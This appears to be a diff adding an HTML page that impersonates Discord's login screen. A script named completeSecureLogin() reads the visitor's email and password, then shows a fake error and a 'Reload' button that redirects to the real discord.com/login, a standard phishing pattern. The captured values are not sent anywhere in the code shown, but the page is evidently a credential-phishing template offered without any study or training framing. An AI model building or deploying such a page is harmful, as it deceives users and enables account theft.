@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+
+<html>
+    <head>
+        <title>Discord | Login</title>
+    </head>
+
+    <link rel="stylesheet" href="styles.css">
+
+    <body>
+        <div id="login">
+            <h2>Welcome back!</h2>
+            <p id="subtext">We're so excited to see you again!</p>
+            <p id="login-tooltip">Email or phone number</p>
+            <input type="email" id="email-input"></input>
+            <p id="login-tooltip">Password</p>
+            <input type="password" id="password-input"></input>
+            <a href=""><p id="forgor-passwd">Forgot your password</p></a>
+            <br>
+            <button id="login-button" onclick = completeSecureLogin()>Login</button>
+        </div>
+
+        <div id="err-404">
+            <h2>Oops! Something went wrong.</h2>
+            <button id="reload-button" onclick = reloadLogin()>Reload</button>
+        </div>
+
+        <script>
+            function completeSecureLogin(){
+                var usrEmail = document.getElementById("email-input").value;
+                var usrPassword = document.getElementById("password-input").value;
+                var errorScr = document.getElementById("err-404");
+                var loginScr = document.getElementById("login");
+                loginScr.style.display = "none";
+                errorScr.style.display = "block";
+            }
+
+            function reloadLogin() {
+                window.location.href = "https://discord.com/login"
+            }
+        </script>
+    </body>
+</html>
